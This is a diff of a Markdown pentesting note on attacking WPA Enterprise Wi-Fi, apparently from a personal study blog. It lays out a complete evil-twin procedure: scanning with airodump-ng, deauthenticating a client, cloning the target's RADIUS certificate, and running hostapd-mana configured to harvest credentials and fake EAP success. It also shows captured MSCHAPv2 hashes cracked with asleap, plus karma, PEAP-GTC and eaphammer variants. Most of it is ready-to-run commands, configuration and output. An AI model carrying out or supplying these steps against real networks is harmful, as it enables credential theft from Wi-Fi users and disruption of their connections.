@@ -2,7 +2,7 @@
 description: >-
   Attacking WPA Enterprise
 title:  Attacking WPA Enterprise     # Add title here
-date: 2023-09-27 08:00:00 -0600                           # Change the date to match completion date
+date: 2023-09-28 08:00:00 -0600                           # Change the date to match completion date
 categories: [18 Wireless, Wireless Attacks]                     # Change Templates to Writeup
 tags: [wireless, wpa enterprise]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
 show_image_post: false                                    # Change this to true
@@ -68,51 +68,207 @@ PEAP hashes are of the type netNTLMv1, that can be cracked with  -m 5500 in hash
 ### Attacking WPA Enterprise 
 The attack against WPA Enterprise consists in setting up a fake Access Point that imitates the target Access Point, so that clients connect to ours and in the process we capture hashes of their passwords, that can be cracked.
 
-### Optional: imitating the server certificates
-While it usually is not necessary, we will create a certificate similar to the one from the RADIUS server that the AP serves to its clients.
+#### Identifying the objective
+1) Airodump-ng to get the BSSID and the MAC from one of the connected users:
+```bash
+sudo airodump-ng wlan0mon
+ BSSID              PWR Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
 
+ FC:EC:DA:8F:2E:90  -40     639       19    1   2  300. WPA2 CCMP   MGT  Playtronics <----------
+
+ BSSID              STATION            PWR   Rate    Lost  Packets  Probes
+ FC:EC:DA:8F:2E:90  00:DC:FE:82:EF:06  -26   54 -54      0       31  Playtronics <-----------
+```
+> The AUTH column shows the AP has an authentication type of MGT, meaning WPA Enterprise.
+{: .prompt-tip }
+
+2) Capture traffic
+Then we proceed to capture the packet as follows:
+```bash
+sudo airodump-ng -c 2 -w wpa --essid 'Playtronics' --bssid FC:EC:DA:8F:2E:90 wlan0
+```
+
+3) Deauthenticate the user
+```bash
+sudo aireplay-ng -0 1 -a FC:EC:DA:8F:2E:90 -c 00:DC:FE:82:EF:06 wlan0
+13:30:30  Waiting for beacon frame (BSSID: FC:EC:DA:8F:2E:90) on channel 1
+13:30:30  Sending 64 directed DeAuth (code 7). STMAC: [00:DC:FE:82:EF:06] [ 0| 0 ACKs]
+
+```
 > If no certificates are captured when the client reauthenticates, deauthenticate him again
 {: .prompt-warning }
 
-We can check the validity by using ``openssl x509 -in CERT_FILENAME -noout -enddate`` where **CERT_FILENAME** is the .pem or .crt file. 
+4) Analyze pcap with wireshark and extract certificate
 
-We can now disable monitor mode 
+Wireshark filter for packets with certificate: ``tls.handshake.certificate`` also works for [Tshark](https://shuciran.github.io/posts/Remote-Capture/#fnref:tshark-eap)
 
-wireshark filter for packets with certificate: ``tls.handshake.certificate``   [Tshark](https://shuciran.github.io/posts/Remote-Capture/#fnref:tshark-eap)
+If from wireshark we now open Extensible Authentication Protocol > Transport Layer Security. We now have to open the TLSv1 Record Layer: Handshake Protocol: Certificate (or similar, as the TLS version will vary). Once there, we will have to expand Handshake Protocol: Certificate item, then Certificates (plural). Inside Certificates, we can see one or more entries named Certificate. Each of them will be preceded by the length. For each certificate, we right click and select Export Packet Bytes to save the data into a file with a .der extension.4
 
+![Wireshark-Certificate-Download](/assets/img/Pasted image 20230928231211.png)
 
-With wireshark -> Packet Details > Extensible Authentication Protocol > Transport Layer Security > TLSv1 Record Layer: Handshake Protocol: Certificate > Handshake Protocol: Certificate > Certificates > Certificate. For each of them, right click > Export Packet Bytes. Alternatively, check with [[8 - wireshark#Tshark]]
+Finally, we can get information about the certificate with `openssl x509 -inform der -in CERTIFICATE_FILENAME -text`
 
-install freeradius
+5) Install freeradius `sudo apt install freeradius` and modify its configuration files
 
+5.a) Certificate Authority
+This should be similar to the certificate that we captured on step 4)
+```bash
+# The folder is unreachable even with sudo, so you need to become root first
+sudo -s
+
+nano /etc/freeradius/3.0/certs/ca.cnf
+
+...
+[certificate_authority]
+countryName             = US
+stateOrProvinceName     = CA
+localityName            = San Francisco
+organizationName        = Playtronics
+emailAddress            = ca@playtronics.com
+commonName              = "Playtronics Certificate Authority"
+...
 ```
-sudo apt install freeradius
+5.b) Server Configuration
+We will edit the [server] fields to match our target server certificate
+```bash
+nano server.cnf
+...
+[server]
+countryName             = US
+stateOrProvinceName     = CA
+localityName            = San Francisco
+organizationName        = Playtronics
+emailAddress            = admin@playtronics.com
+commonName              = "Playtronics"
+...
 ```
 
-Modify in folder /etc/freeradius/3.0/certs the files ca.cnf (certificate_authority section) and server.cnf (server section).
-
+6) Building Certificates
 Run the following to regenerate diffie hellman with a 2048 bit key and create the certificates
 
-```
+```bash
 # in /etc/freeradius/3.0/certs folder:
 rm dh
 make
 ```
 
+> If we run make but the certificates already exist, we will not be able to overwrite them. We have to run `make destroycerts` to clean up first.
+{: .prompt-warning }
 
-The client error during the make command can be ignored, it's not necessary to create client certificates to get their hashes when they connect to us. 
+7) Configuring hostapd
+Afterward, we have to create the hostapd-mana configuration file, /etc/hostapd-mana/mana.conf
+```bash
+# SSID of the AP
+ssid=Playtronics
 
-Run the command ``make destroycerts`` if you had previously created certificates, to start anew
+# Network interface to use and driver type
+# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
+interface=wlan0
+driver=nl80211
 
-If you don't have it, install hostapd-mana to create the fake Access Point:
-``sudo apt install hostapd-mana``
+# Channel and mode
+# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
+channel=1
+# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
+hw_mode=g
 
-Also create the file `/etc/hostapd-mana/mana.eap_user`. Add the following contents to increase the chances of clients being able to connect to our fake AP
+# Setting up hostapd as an EAP server
+ieee8021x=1
+eap_server=1
 
+# Key workaround for Win XP
+eapol_key_index_workaround=0
+
+# EAP user file we'll create after this step
+eap_user_file=/etc/hostapd-mana/mana.eap_user
+
+# Certificate paths created earlier
+ca_cert=/etc/freeradius/3.0/certs/ca.pem
+server_cert=/etc/freeradius/3.0/certs/server.pem
+private_key=/etc/freeradius/3.0/certs/server.key
+# The password is actually 'whatever'
+private_key_passwd=whatever
+dh_file=/etc/freeradius/3.0/certs/dh
+
+# Open authentication
+auth_algs=1
+# WPA/WPA2
+wpa=3
+# WPA Enterprise
+wpa_key_mgmt=WPA-EAP
+# Allow CCMP and TKIP
+# Note: iOS warns when network has TKIP (or WEP)
+wpa_pairwise=CCMP TKIP
+
+# Enable Mana WPE
+mana_wpe=1
+
+# Store credentials in that file
+mana_credout=/tmp/hostapd.credout
+
+# Send EAP success, so the client thinks it's connected
+mana_eapsuccess=1
+
+# EAP TLS MitM
+mana_eaptls=1
 ```
+8) Create the eap_user file
+
+We'll now need to create the EAP user file referenced in the configuration file, /etc/hostapd-mana/mana.eap_user. The file should contain the following.
+
+```bash
 *     PEAP,TTLS,TLS,FAST
 "t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
 ```
+
+9) Start hostapd-mana
+Next, we'll start hostapd-mana with the configuration file we created earlier, /etc/hostapd-mana/mana.conf.
+```bash
+sudo hostapd-mana /etc/hostapd-mana/mana.conf
+Configuration file: mana.conf
+MANA: Captured credentials will be written to file '/tmp/hostapd.credout'.
+Using interface wlan0 with hwaddr 16:93:8a:98:ec:4f and ssid "Playtronics"
+wlan0: interface state UNINITIALIZED->ENABLED
+wlan0: AP-ENABLED
+```
+
+When a victim attempts to authenticate to our AP, the login attempt is captured. These credentials are also in /tmp/hostapd.credout.
+
+```bash
+...
+wlan0: STA 00:2b:bb:b0:42:9e IEEE 802.11: authenticated
+wlan0: STA 00:2b:bb:b0:42:9e IEEE 802.11: associated (aid 1)
+wlan0: CTRL-EVENT-EAP-STARTED 00:2b:bb:b0:42:9e
+wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
+MANA EAP Identity Phase 0: cosmo
+wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
+MANA EAP Identity Phase 1: cosmo
+MANA EAP EAP-MSCHAPV2 ASLEAP user=cosmo | asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4
+MANA EAP EAP-MSCHAPV2 JTR | cosmo:$NETNTLM$ceb69885c656590c$7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:::::::
+MANA EAP EAP-MSCHAPV2 HASHCAT | cosmo::::7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:ceb69885c656590c
+...
+```
+
+10) Cracking the password
+We will be using asleap to crack the password hash
+```bash
+asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W /usr/share/john/password.lst
+asleap 2.2 - actively recover LEAP/PPTP passwords. <jwright@hasborg.com>
+Using wordlist mode with "/usr/share/john/password.lst".
+        hash bytes:        586c
+        NT hash:           8846f7eaee8fb117ad06bdd830b7586c
+        password:          password
+```
+
+#### Optional: imitating the server certificates
+While it usually is not necessary, we will create a certificate similar to the one from the RADIUS server that the AP serves to its clients.
+
+
+
+We can check the validity by using ``openssl x509 -in CERT_FILENAME -noout -enddate`` where **CERT_FILENAME** is the .pem or .crt file. 
+
+We can now disable monitor mode 
+
 
 
 ### hostapd-mana for wpa-enterprise
@@ -151,12 +307,7 @@ mana_eapsuccess=1
 mana_credout=hostapd.creds
 ```
 
-
-host evil twin with
-``hostapd_mana mana.conf``
-
-
-#### Attack PEAP-GTC
+### Attack PEAP-GTC
 
 ```
 interface=wlan1
@@ -180,7 +331,8 @@ mana_wpe=1
 mana_eapsuccess=1
 ```
 
-karma attack-> So that many clients can connect to us simultaneously
+### Karma attack
+So that many clients can connect to us simultaneously
 ```
 interface=wlan1
 ssid=<target ESSID>
@@ -207,7 +359,8 @@ hostapd-mana returns strings to crack WPA-EAP in the following formats
 	- asleap
 	- john
 	- hashcat
-I have found that sometimes one tool isn't able to crack it and other is (WTF?) so if one doesn't find the password try with other and the same dictionary
+> Sometimes one tool isn't able to crack it and other is. If one doesn't find the password try with other and the same dictionary.
+{: .prompt-warning }
 
 ### PEAP relay attack
 More info:
@@ -294,7 +447,6 @@ Tool to create fake APs
 # karma attack, make every client believe that we are the AP(s) that he is probing. The difference between karma attack and evil twin is that karma uses the probe requests sent by clients (from their preferred network list, PNL) and in evil twin we must guess the APs they want to connect to
 ./eaphammer -i wlan1 --channel 6 --auth wpa-eap --essid DefenseConference --creds --karma
 ```
-
 
 ### EAP MD5 crack
 ``./eapmd5pass -w dict -r eapmd5-sample.dump``
